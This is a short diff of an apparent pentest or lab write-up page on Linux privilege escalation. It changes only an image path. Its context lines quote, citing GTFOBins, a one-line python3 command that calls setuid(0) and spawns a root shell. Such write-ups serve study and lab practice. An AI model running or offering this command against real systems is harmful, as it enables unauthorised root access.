@@ -76,7 +76,7 @@ Aaccording to GTFOBins, it can be easily exploited with the following command, w
 /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
 
-![](<../../../.gitbook/assets/image (11) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (11) (1) (1) (1) (1).png>)
 
 Executing the command while logged in as a non-root user:
 
